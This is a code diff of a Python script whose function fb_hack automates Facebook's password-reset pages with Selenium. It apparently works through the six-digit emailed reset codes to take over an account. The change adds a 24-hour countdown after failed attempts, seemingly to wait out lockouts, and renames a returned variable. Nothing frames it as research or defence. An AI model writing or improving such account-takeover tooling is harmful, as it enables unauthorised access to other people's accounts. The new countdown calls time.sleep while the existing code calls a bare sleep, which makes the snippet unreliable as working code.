@@ -34,6 +34,17 @@ def sleepy(counter):
       print(x, end='\r')
     sleep(1)
 
+def countdown(t):
+    while t:
+        mins, secs = divmod(t, 60)
+        timer = '{:02d}:{:02d}'.format(mins, secs)
+        print(timer, end="\r")
+        time.sleep(1)
+        t -= 1
+
+    print('Time is up!')
+
+
 def fb_hack(email, codex):
   os.system('clear')
   soup = BeautifulSoup()
@@ -54,9 +65,10 @@ def fb_hack(email, codex):
     sleep(2)
     driver.save_screenshot("fail1.png")
     print("Failed at email")
+    past = codex
     t = 86400
     countdown(t)
-    return codex
+    return past
   try:
     search_button = driver.find_element(by = By.NAME, value = "tryanotherway")
     search_button.click()
@@ -65,9 +77,10 @@ def fb_hack(email, codex):
     sleep(2)
     driver.save_screenshot("fail2.png")
     print("Failed at try another way")
+    past =codex
     t = 86400
     countdown(t)
-    return codex
+    return past
   try:
     search_button = driver.find_element(by = By.NAME, value = "reset_action")
     search_button.click()
@@ -78,7 +91,8 @@ def fb_hack(email, codex):
     print("Failed at reset action")
     t = 86400
     countdown(t)
-    return codex
+    past = codex
+    return past
   counter = 0
   test = soup.find(string="pop")
   sixdigits = soup.find(string="Please check your email for a message with your code. Your code is 6 numbers long.")
